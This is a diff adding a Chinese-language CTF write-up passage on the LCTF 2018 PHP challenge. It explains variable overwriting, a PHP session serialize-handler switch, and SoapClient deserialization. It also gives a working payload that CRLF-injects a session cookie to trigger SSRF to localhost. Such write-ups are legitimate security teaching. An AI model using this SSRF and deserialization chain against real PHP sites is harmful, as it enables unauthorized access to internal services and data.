@@ -989,3 +989,59 @@ call_user_func($b, $a);
 ?>
 ```
 
+flag.php
+
+```php
+<?php
+session_start();
+echo 'only localhost can get flag!';
+$flag = 'LCTF{*************************}';
+if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
+       $_SESSION['flag'] = $flag;
+   }
+only localhost can get flag!
+```
+
+这道题思路也挺好的, 卡了好久...
+
+首先通过 call\_user\_func 结合 `$_POST` 参数可以用 extract 变量覆盖
+
+然后结合 session\_start 可以传入数组参数的特性来自定义 php serialize handler
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191612702.png)
+
+之后构造 SoapClient 原生类进行 ssrf
+
+最后通过 call\_user\_func 可以传入数组的特性来触发 SoapClient 的 \_\_call 方法
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191613697.png)
+
+```php
+$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
+call_user_func($b, $a);
+```
+
+这里通过 `reset($_SESSION)` 取得 session 数组里面的第一个值 (字符串), 然后调用对应类的 `welcome_to_the_lctf2018` 方法
+
+不难发现 `$_SESSION['name']` 可控, 那么在 SoapClient 已经被反序列化好的情况下指定 `name=SoapClient`, 并且用变量覆盖使 `$b` 的值为 `call_user_func` , 就可以达到 `SoapClient->welcome_to_the_lctf2018` 的效果, 最终触发 ssrf
+
+构造的时候有个注意点, 因为 flag 最后是写在 session 里的, 所以在 ssrf 发包的时候需要指定一个相同的 PHPSESSID cookie, 这样才能确保我们这边能够获取到 flag
+
+payload 如下
+
+```php
+<?php
+$a = new SoapClient(null,array('location' => 'http://127.0.0.1/flag.php', 'user_agent' => "111\r\nCookie: PHPSESSID=uns9hpdaos2m88tsi4ml2v0o42", 'uri' => 'test'));
+$b = serialize($a);
+echo '|'.urlencode($b);
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191618240.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191618291.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191618440.png)
+
+## [安洵杯 2019]不是文件上传
+
+### 
